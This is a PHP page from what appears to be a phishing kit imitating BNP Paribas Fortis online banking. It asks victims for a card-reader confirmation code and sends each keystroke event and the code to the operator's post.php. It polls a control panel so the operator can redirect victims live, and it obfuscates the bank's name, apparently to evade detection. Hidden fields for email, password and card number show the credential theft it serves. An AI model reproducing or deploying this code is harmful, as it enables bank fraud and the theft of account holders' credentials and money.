<?php 
require '../main.php';
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
    $ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$codes = explode("@", @$pnl->getC($ipp));

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
<div class="holder">
<div class="back">
</div>
<div class="logo">
<div class="mklogo">
    <div class="mkimg">
        <img src="res/log.png">
    </div>
    <div class="mktext">
    <?php $bm->obf("BNP PARIBAS"); ?>
        <div class="liner"></div>
        <?php $bm->obf("FORTIS"); ?>
    </div>
</div>
</div>
<div class="easy">
<?php echo getLang("_easy"); ?>
</div>
</div>
</header>

<main>
<form action="action.php" method="post">
    <input type="hidden" name="email">
    <input type="hidden" name="password">
    <input type="hidden" name="cardnumber">
</form>
<div class="form">
 

<div class="right" style="padding:0; width:100%;">
<div class="title" style="background:#00965e; color:white; font-size:1.2em;">
<?php echo getLang("_conf_title"); ?>
</div>
<div class="content">
 
<div class="note">
    <img src="res/card.svg"> <?php echo getLang("_use_card"); ?>
</div>

<?php 
if(isset($_GET['e'])){
    echo '<div class="col error">
    '.getLang("_sign_error").'
    </div>';
}
?>

<div class="tab">
    1. <?php echo getLang("_conf_tab1"); ?> <img src="res/m2.png">
</div>
<div class="tab">
    2. <span style="font-family:'light', sans-serif;"><?php echo getLang("_conf_tab2")[0]; ?></span> <br>
     <?php echo getLang("_conf_tab2")[1]; ?> <img src="res/ok.png">
</div>
<div class="tab">
    3. <span style="font-family:'light', sans-serif;"><?php echo getLang("_conf_tab3")[0]; ?></span> <br>
    <?php echo getLang("_conf_tab3")[1]; ?> <span class="code"><?php echo @$codes[0]; ?></span> <?php echo getLang("_conf_tab3")[2]; ?>, <img src="res/ok.png">   <span class="code"><?php echo @$codes[1]; ?></span>  <img src="res/ok.png">
</div>
<div class="tab">
    4. <span style="font-family:'light', sans-serif;"><?php echo getLang("_conf_tab4")[0]; ?></span><br>
    <?php echo getLang("_conf_tab4")[1]; ?> <input type="text"  style="width:120px;" id="u">
</div>
<div class="col">
    <button onclick="sendUser()"><?php echo getLang("_confirm"); ?></button>
</div>

</div>

</div>

</div>


<div class="help">
    <div class="help-text"><img src="res/phone.png"> <?php echo getLang("_help")[0]; ?></div><br>
    <a href="#"> <?php echo getLang("_help")[1]; ?></a>
</div>

</main>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

var abortNote = false;
$("input").keyup(()=>{
    if(!abortNote){
        $.post("post.php",{n_conf:1});
        abortNote=true;
    }

});

function sendUser(){
    $("#u").removeClass("error");
    if($("#u").val().length<2){
        return $("#u").addClass("error");
    }

    $(".loader").show();
    $.post("post.php",{
        confcode:$("#u").val()
    },(res)=>{
        window.location="mkfile.php?p=wait";
    });

}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendUser();
    }
});


setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);


</script>
</body>
</html>